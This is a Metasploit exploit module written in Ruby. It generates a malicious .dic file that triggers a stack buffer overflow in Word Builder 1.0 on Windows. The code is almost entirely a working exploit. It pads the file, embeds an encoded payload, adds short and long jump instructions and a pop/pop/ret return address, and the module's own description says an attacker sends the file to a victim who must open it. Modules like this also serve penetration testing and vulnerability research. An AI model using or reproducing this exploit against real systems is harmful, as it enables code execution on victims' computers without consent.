##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Word Builder 1.0 (DIC File) Stack Buffer Overflow',
            'Description'    => %q{
                    This module exploits a stack-based buffer overflow in Word Builder 1.0.  An attacker must send the file to the victim and the victim must open the file.
            },
            'License'        => MSF_LICENSE,
            'Author'         => [
                          'h1ch4m',      # Initial Discovery
                          'James Fitts' # Metasploit Module
                        ],
            'Version'        => '$Revision: $',
            'References'     =>
                [
                    [ 'URL', 'http://www.exploit-db.com/exploits/17086' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                    'DisablePayloadHandler' => 'true',
                },
            'Payload'        =>
                {
                    'Space'    => 1500,
                    'BadChars' => "\x00\x0a\x0d",
                },
            'Platform' => 'win',
            'Targets'        =>
                [
                    [ 'Windows Universal', { 'Ret' => 0x00411ce2 } ], #p/p/r in word_builder.exe
                ],
            'Privileged'     => false,
            'DisclosureDate' => 'Apr 01 2011',
            'DefaultTarget'  => 0))
 
            register_options(
                [
                    OptString.new('FILENAME', [ true, 'The file name.',  'msf.dic']),
                ], self.class)
    end
 
    def exploit
 
        dic = rand_text_alpha_upper(4103 - payload.encoded.length) + payload.encoded
        dic << "\xe9\xfe\xef\xff\xff" # jmp $-4093
        dic << "\x90\x90\xeb\xf7" # jmp $-7
        dic << [target.ret].pack('V')
 
        print_status("Creating '#{datastore['FILENAME']}' file ...")
 
        file_create(dic)
 
    end
 
end
